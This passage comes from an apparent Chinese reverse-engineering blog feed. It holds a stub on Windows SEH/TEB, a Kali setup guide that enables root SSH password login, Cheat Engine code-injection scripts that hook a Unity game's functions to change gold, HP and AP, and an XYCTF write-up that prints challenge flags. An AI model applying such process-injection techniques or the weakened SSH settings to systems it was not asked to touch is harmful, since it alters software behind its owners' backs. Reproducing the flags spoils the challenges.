    <content type="html"><![CDATA[<p>SEH结构化异常处理：</p><p>由于这个东西是基于线程的，所以先学习一下PEB和TEB</p><h2 id="TEB-PEB">TEB&amp;PEB</h2><p>线程环境块</p><p>系统在TEB中保存了最频繁使用的线程相关数据，大小为4kb。系统中每个进程都有一个自己的TEB，一个进程的所有TEB都以堆栈的形式存放在内存中。同理，PEB为进程环境块，TEB中有指向PEB的指针，每个进程的PEB也以堆栈形式放在内存中</p><ul><li>在x64架构环境下，<code>GS + 30h</code>处存储的是Teb结构体的基地址，<code>GS + 60h</code>处存储的是Peb结构体的基地址。</li><li>在x86架构环境下，<code>FS + 18h</code>处存储的是Teb结构体的基地址，<code>FS + 30h</code>处存储的是Peb结构体的基地址。</li></ul><p>而指向SEH链开头就是TEB的0号位<br>以下是TEB与seh的关系<br><img src="https://s2.loli.net/2024/05/04/GBMrJPKWZhiuNL2.png" alt="867232_UQX698BZWQ7UZ8Y"></p><p>[施工中]</p>]]></content>
    
    
    <summary type="html">SEH!</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>kali配置步骤</title>
    <link href="https://www.pri87.vip/posts/8e948a96.html"/>
    <id>https://www.pri87.vip/posts/8e948a96.html</id>
    <published>2024-05-02T05:21:58.000Z</published>
    <updated>2024-05-02T12:54:13.611Z</updated>
    
    <content type="html"><![CDATA[<p>今天不小心把kali删了，于是准备重新装一个，之前装的时候也没有怎么仔细用过，权当是用来调试elf，所以趁放假重新配一个，顺便记录一下流程。</p><hr><h2 id="安装kali-linux">安装kali-linux</h2><p>下载vmware</p><p><a href="https://www.vmware.com/">VMware - Delivering a Digital Foundation For Businesses</a></p><p>下载kali</p><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p><p><img src="https://s2.loli.net/2024/05/02/LxIoaKvrtRCSXpf.png" alt="image-20240502133052716"></p><p>建议图里面框着的这个</p><p><a href="https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z">下载直链</a></p><hr><p>下载完成后解压并打开文件夹，如果已经安装好了VMware，那么双击vmx文件会自动弹出VMware并配置好虚拟机。现在就可以用了。</p><p>点击开启。</p><p>账户和密码均为kali</p><p>现在就可以使用了。</p><hr><h2 id="基本设置">基本设置</h2><h3 id="设置中文">设置中文</h3><p>输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>在对应选框按空格选择对应语言包然后按回车确认</p><p><img src="https://s2.loli.net/2024/05/02/hnwkv8z2C7GdFir.png" alt="image-20240502140958050"></p><p>后一个页面在zh_CN.UTF-8的位置回车</p><p>重启后生效。</p><h3 id="更新软件包">更新软件包</h3><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>来更新软件包</p><h3 id="换源">换源</h3><p>安装leafpad</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install leafpad</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加源：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#中科大</span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#阿里云</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#清华大学</span></span><br><span class="line">deb http:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br></pre></td></tr></table></figure><h3 id="获取vscode-其实用vim也可以">获取vscode/其实用vim也可以</h3><p>打开火狐，直接搜索官网</p><p>下载deb版本</p><p>在download文件夹使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i ./(文件名)</span><br></pre></td></tr></table></figure><h3 id="改变字体">改变字体</h3><p>下载好自己想要的字体，我的字体是内置的</p><p>在终端-文件-参数配置-第一行修改字体和大小</p><h3 id="配置ssh">配置ssh</h3><p>编辑config</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>#PasswordAuthentication yes行去掉#</p><p>#PermitRootLogin prohibit-password去掉#</p><p>把prohibit-password改为yes</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh start</span><br><span class="line">sudo service ssh status</span><br></pre></td></tr></table></figure><p>此时如果有：</p><p><code>active(running)</code>就算成功</p><h2 id="基本环境配置">基本环境配置</h2><p>由于不懂web，所以只配了其它环境</p><h3 id="RE环境配置">RE环境配置</h3><p>创建一个文件夹，放入ida的调试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linux_server</span><br><span class="line">chmod 777 linux_server64</span><br></pre></td></tr></table></figure><p>修改权限</p><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>查看ip端口号</p><p><img src="https://s2.loli.net/2024/05/02/Jsgn1Mho3uKSp6w.png" alt="image-20240502155336325"></p><p>先执行对应的server(如果你的文件是32位的就不加64)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_server64</span><br></pre></td></tr></table></figure><p>然后在ida中输入</p><p><img src="https://s2.loli.net/2024/05/02/TNQqLdpEAug6Vaf.png" alt="image-20240502155358135"></p><p>调试成功</p><h3 id="CRY环境配置">CRY环境配置</h3><h4 id="安装docker">安装docker</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker docker-compose </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或</span></span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动docker服务</span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出docker现有镜像</span></span><br><span class="line">docker images</span><br><span class="line"> </span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果弹出</p><p><img src="https://s2.loli.net/2024/05/02/PGaHBt7Fr8IJisT.png" alt="image-20240502161037944"></p><p>表明成功</p><h4 id="安装sage-math">安装sage-math</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sagemath/sagemath</span><br></pre></td></tr></table></figure><p>拉取镜像</p><p>最后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it sagemath/sagemath:latest</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/aDfsTwqE79OztFQ.png" alt="image-20240502161640136"></p><p>成功</p><p>由于sage的python好像模块不齐，还要配置模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p8888:8888 sagemath/sagemath:latest sage-jupyter</span><br></pre></td></tr></table></figure><p>打开交互式环境，点击最下面的链接</p><p><img src="https://s2.loli.net/2024/05/02/Sx1UzhFfamklsEg.png" alt="image-20240502163425729"></p><p>new - terminal</p><p>在这里pip install就好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br><span class="line">pip install crypto</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/Jnz4YKiud9GDBcI.png" alt="image-20240502164306991"></p><p>安装好了测试一下，在new中选择sagemath10.3</p><p><img src="https://s2.loli.net/2024/05/02/81NgP2YGifK3EDc.png" alt="image-20240502164335278"></p><h3 id="PWN环境配置">PWN环境配置</h3><h4 id="pwntool安装">pwntool安装</h4><p>因为是py库，用来写exp的</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install <span class="comment">--upgrade pwntools</span></span><br></pre></td></tr></table></figure><p>其实应该在本机安的，感觉方便一点</p><h4 id="pwndbg安装">pwndbg安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h4 id="插件安装">插件安装</h4><p>peda</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p>pwngdb</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure><p>由于正常情况插件不能一起使用？？所以要配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line">sudo leafpad /.gdbinit</span><br></pre></td></tr></table></figure><p>在其中写入：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwndbg/g</span>dbinit.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/peda/</span>peda.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwngdb/</span>pwngdb.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/Pwngdb/</span>angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>注意目录必须和安装位置一样，上面的地址默认是在~目录下载的</p><p>然后</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line"><span class="built_in">file</span> xxx</span><br><span class="line"><span class="built_in">start</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/jMg94u3cXY5wify.png" alt="image-20240502190833611"></p><p>成功</p><h3 id="MISC环境配置">MISC环境配置</h3><p>misc里面需要的东西有点杂，而且很多其实在windows里面都有代替，所以感觉没什么必要，但是保险起见（防止之后我作死），还是写一点</p><h4 id="foremost">foremost</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure><p>检查：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">foremost -h</span></span><br></pre></td></tr></table></figure><h4 id="binwalk">binwalk</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h4 id="ciphey">ciphey</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> python3-ciphey</span><br></pre></td></tr></table></figure><p>差不多这几个工具吧（<s>弗如随波逐流</s>）</p><hr><p>之后应该也有更新QAQ</p><p>参考：</p><p><a href="https://www.cnblogs.com/huajianyizou/p/kali1.html#_label3">Kali下载安装以及基础配置 - 清光照归途 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_46318141/article/details/121168812">kali下对Docker的详细安装_kali安装docker-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/qq_46145027/article/details/124912352">密码学]利用docker安装与使用sagemath_kali安装sagemath-CSDN博客</a></p><p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">gdb与peda、pwngdb、pwndbg组合安装与使用_gdb peda-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">不小心把kali删了QAQ</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="kali" scheme="https://www.pri87.vip/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>CE与mono模块_1</title>
    <link href="https://www.pri87.vip/posts/b58030d5.html"/>
    <id>https://www.pri87.vip/posts/b58030d5.html</id>
    <published>2024-05-01T14:32:07.000Z</published>
    <updated>2024-05-06T13:30:28.710Z</updated>
    
    <content type="html"><![CDATA[<p>今天不想学习，想玩游戏，所以就打开了一个肉鸽游戏，尝试开挂。</p><p>参考：<a href="https://www.bilibili.com/read/cv12648903/">【CheatEngine基础教程】四、Unity3D游戏《晚上nano好》修改实战</a></p><hr><p>先打开游戏目录，看看是哪类游戏</p><ul><li>rpgmaker：解包+编辑器用工程文件打开</li><li>gamemaker：js反混淆得到源代码</li><li>unity il ：ce+dnspy</li><li>unity il2cpp：恢复符号表ida改cpp代码+ce</li></ul><p>在Managed文件夹中：</p><p><img src="https://s2.loli.net/2024/05/01/zCu6egoh4MGdD1b.png" alt="image-20240501224552961"></p><p>很明显可以看出是unity游戏</p><p>首先要明确目标：</p><p>这是一个卡牌rougelike游戏，玩家操作2~4个角色+一个主角打败复数的敌人</p><p>修改金钱，技能点（升级人物），人物血量，每回合费用</p><p>那么开始</p><hr><h2 id="修改基本数据">修改基本数据</h2><p>由于这个游戏是unity游戏，可以直接通过ce的mono分析模块来方便地检测内容并hook函数</p><p><img src="https://s2.loli.net/2024/05/01/WhaZ835mzOniIXE.png" alt="image-20240501232651548"></p><p>这样打开这个功能，然后搜索金钱数量，直到找到对应的值</p><p><img src="https://s2.loli.net/2024/05/01/VfbATiPKu9JMcIX.png" alt="image-20240501232847246"></p><p>右键，查找是什么改写了这个值</p><p>得到：</p><p><img src="https://s2.loli.net/2024/05/01/W3fw4BKvlXYamz9.png" alt="image-20240501233125213"></p><p>详细分析一下这个代码，会发现这里的地址是写死的，以字面量直接放到内容里面，这是为什么呢？</p><p>由于unity是cs语言，cs在编译时只生成il中间代码，在CLR虚拟机中执行，相当于java里面的虚拟机。这样，它边执行边编译，直接把对应的值写死在编译出的代码里面，然后直接执行，这样当然可以每次都使用字面量而每次都可以不一样。</p><p>这也说明不能通过找多级指针来寻找基址，需要另一种方法。</p><p>由于开启了mono分析功能，在检测界面点击：显示反汇编程序：</p><p><img src="https://s2.loli.net/2024/05/01/SDkHMu6Xsi4WBvK.png" alt="image-20240501233819497"></p><p>可以看到已经把函数名翻译出来了，那么我们可以从函数名下文章直接找值，由于函数名是一定的，从函数名开始的偏移也是一定的，这样就可以直接找到对应的变量而不需要找基址。可以看到这里的方法是金币的set方法</p><p>在dnspy中查看</p><p><img src="https://s2.loli.net/2024/05/01/rHcURCS4dVo8nwQ.png" alt="image-20240501234129448"></p><p>显然找get更好</p><p>在ce中ctrl+g跳转:PlayData:get_Gold</p><p>只有1c的长度</p><p><img src="https://s2.loli.net/2024/05/01/9tNqvX15Gkb26Wp.png" alt="image-20240501234429636"></p><p>可以直接从11行取出rax+25c作为gold的值，但是get和set在这里都有rax+25c的偏移，可以怀疑这里有一个结构体，如果可以找到结构体开始的值，相当于整个内容都有了，只不过还有解决每个值对应的内容是什么的问题。这时mono分析功能又派上用场了：</p><p>ctrl+d:</p><p>把我们金钱的地址填进去-结构-定义新的结构：</p><p>它把所有信息显示出来了（还有偏移量）：</p><p><img src="https://s2.loli.net/2024/05/01/yucfLIpWzjeVgK6.png" alt="image-20240501234828639"></p><p>一开始的值就是上面函数中的字面量，soul就是技能点，把这两个偏移记住</p><p>在内存查看中-工具-自动汇编-写自动汇编脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ENABLE]</span><br><span class="line">&#123;$lua&#125;</span><br><span class="line">if syntaxcheck then return end</span><br><span class="line">if (LaunchMonoDataCollector()==0) then error(&quot;No Mono&quot;) end</span><br><span class="line">;判断mono功能是否开启</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aobscanregion(getGoldMethod,PlayData:get_Gold,PlayData:get_Gold+FF,48 B8)</span><br><span class="line">;取到对应函数对应位的对应值（结构体开始位置）</span><br><span class="line">alloc(Pridata,8)</span><br><span class="line">;生成标签，以标签开头的内容作为标签区域的代码，标签内容是可读可写可执行的</span><br><span class="line">registersymbol(Pridata)</span><br><span class="line">;把标签升为全局变量，可以在其它位置使用，比如制作指针的时候</span><br><span class="line">Pridata:</span><br><span class="line">readmem(getGoldMethod+2,8)</span><br><span class="line">;将对应位置写入全局变量</span><br><span class="line">[DISABLE]</span><br><span class="line">dealloc(Pridata)</span><br><span class="line">unregistersymbol(Pridata)</span><br></pre></td></tr></table></figure><p>这样我们保存后就保存了对应的结构体指针</p><p>然后根据偏移：</p><p><img src="https://s2.loli.net/2024/05/01/pix2qoOGMdzXTIL.png" alt="image-20240501235648619"></p><p>做出指针，后面的soul同理，不再赘述</p><p>在这个结构体中还有人物血量：</p><p>同理把找到的结构体开头作为基址来偏移就好</p><p><img src="https://s2.loli.net/2024/05/01/SOsnpq3f876uJy9.png" alt="image-20240501235927670"></p><p>最后还有cost，每回合费用，它不在这个结构体里面，重新搜索，如法炮制：</p><p>先看结构体偏移8c</p><p>找到setAP函数和getAP函数，这两个函数似乎都没有硬编码的地址，也比较合理，每次开一个战斗都要重新生成一次，但是可以看到：</p><p><img src="https://s2.loli.net/2024/05/02/GAPbXhqDOozjyxf.png" alt="image-20240502000544674"></p><p>明显结构体开头在r15，但是拿不到值，干脆直接注入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Enable]</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line">alloc(newmem,512,BattleTeam:SetAP+11d)</span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line">alloc(Battledata,8)</span><br><span class="line">registersymbol(Battledata);创建全局变量</span><br><span class="line">newmem:;插入获取的代码</span><br><span class="line">mov [Battledata],r15</span><br><span class="line">originalcode:;原来的代码</span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">BattleTeam:SetAP+11d:;把目标地址改成跳转</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br><span class="line"></span><br><span class="line">[Disable]</span><br><span class="line">BattleTeam:SetAP+11d:;还原代码</span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line">dealloc(Battledata)</span><br><span class="line">dealloc(newmem)</span><br><span class="line"></span><br><span class="line">&#123;$asm&#125;</span><br></pre></td></tr></table></figure><p>这样就拿到结构体头了，不过因为是代码注入，必须要调用一次这个函数之后才可以得到值。</p><p>同理就得到AP的值了。</p><hr><h2 id="锁血和秒杀">锁血和秒杀</h2><hr><h2 id="角色信物">角色信物</h2><p>这个游戏有一个设定，解锁角色需要一些条件。然后如果想要看后日谈，需要解锁所有角色，然后用对应的礼物给对应的角色3次，并在最后打最终boss的时候带上他们并通关，这需要花费的时间太长了，很离谱，所以准备修改一下。</p><p>在dnspy中搜索角色数据，任意搜索一下，找到了一个用于返回这一个角色数据的函数：</p><p><img src="https://s2.loli.net/2024/05/06/sMQwtbKVmOk93EP.png" alt="image-20240506212320587"></p><p>通过这个查找被什么使用</p><p>找到给礼物的函数：</p><p><img src="https://s2.loli.net/2024/05/06/AkKPJTcZufQoRle.png" alt="image-20240506212840126"></p><p>这个函数表明可以通过charid来查找对应的charData</p>]]></content>
    
    
    <summary type="html">使用CE中的mono分析模块对unity游戏进行分析</summary>
    
    
    
    <category term="实践" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
    <category term="游戏逆向" scheme="https://www.pri87.vip/tags/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/"/>
    
    <category term="unity" scheme="https://www.pri87.vip/tags/unity/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF-r22题目复现</title>
    <link href="https://www.pri87.vip/posts/8a68bf71.html"/>
    <id>https://www.pri87.vip/posts/8a68bf71.html</id>
    <published>2024-04-26T15:35:39.000Z</published>
    <updated>2024-04-28T14:26:59.701Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2024-wp</title>
    <link href="https://www.pri87.vip/posts/685012f7.html"/>
    <id>https://www.pri87.vip/posts/685012f7.html</id>
    <published>2024-04-26T15:28:28.000Z</published>
    <updated>2024-05-02T12:53:54.544Z</updated>
    
    <content type="html"><![CDATA[<p>能说什么呢，这题。。。难以言喻</p><hr><h2 id="RE">RE</h2><h3 id="week1">week1</h3><h4 id="DebugMe">DebugMe</h4><p>这个是安卓动态调试，之前遇到过一个类似的，但是不同的是，那个直接在模拟器里面调就可以，这次这个好像没有被jadx识别到。</p><p>然后学到了另外一种方法：</p><p>在jadx调试界面直接点击启动ADB服务，然后打开模拟器，点击刷新，就能看到所有进程，然后就可以调试了</p><p>这个时候点击按钮，出flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;d3bugg3r_15_v3ry_u53ful&#125;</span></span><br></pre></td></tr></table></figure><h4 id="你真的是大学生吗？">你真的是大学生吗？</h4><p>这个是一个16位dos程序，ida打开看汇编还原程序</p><p>加密逻辑：</p><p><img src="https://s2.loli.net/2024/04/06/OKsLR8WFtHxiI92.png" alt="image-20240406123918332"></p><p>相当于每次和下一位xor</p><p>之前没怎么搞懂mov si ，2F，然后发现是把它当地址。。没看明白add si,cx有什么用，可能add si,cx是创建一个空缓冲区存输入的。</p><p>加密逻辑确实是从最后开始向前异或，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = *p2;</span><br><span class="line">p2-=<span class="number">1</span>;</span><br><span class="line">*p2 ^= a;</span><br></pre></td></tr></table></figure><p>那直接逆向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=a[(i+<span class="number">1</span>)%<span class="built_in">len</span>(a)]</span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;</span></span><br></pre></td></tr></table></figure><h4 id="喵喵的flag碎了一地">喵喵的flag碎了一地</h4><p>这个不用多说，直接跟着提示走就好</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">My_fl@</span><span class="symbol">g_h4s_br0ken_4parT_Bu7_Y0u_c@</span>n_f1x_1t!&#125;</span><br></pre></td></tr></table></figure><h4 id="聪明的信使">聪明的信使</h4><p>一眼凯撒加密，拿去爆破</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;</span><br></pre></td></tr></table></figure><p>偏移是9</p><h4 id="Trustme">Trustme</h4><p>解包之后感觉哪里不对，好像什么都没有，但是assets里面有一个mydb的文件，打开看看，全是0xff，异或一下试试，出来了QAQ</p><p>查一下知道这个是SQLite文件，用在线工具分析文件得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;And0r1d_15_V3ryEasy&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Baby-Unity-ez-Unity">Baby Unity / ez Unity</h4><p>这两个的做法一模一样，唯一的区别是ez里面的dat文件头被修改了，先放flag，然后记录一下第一次遇到li2cpp的题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">389</span>f6900-e12d-<span class="number">4</span>c54-a85d-<span class="number">64</span>a54af9f84c&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span 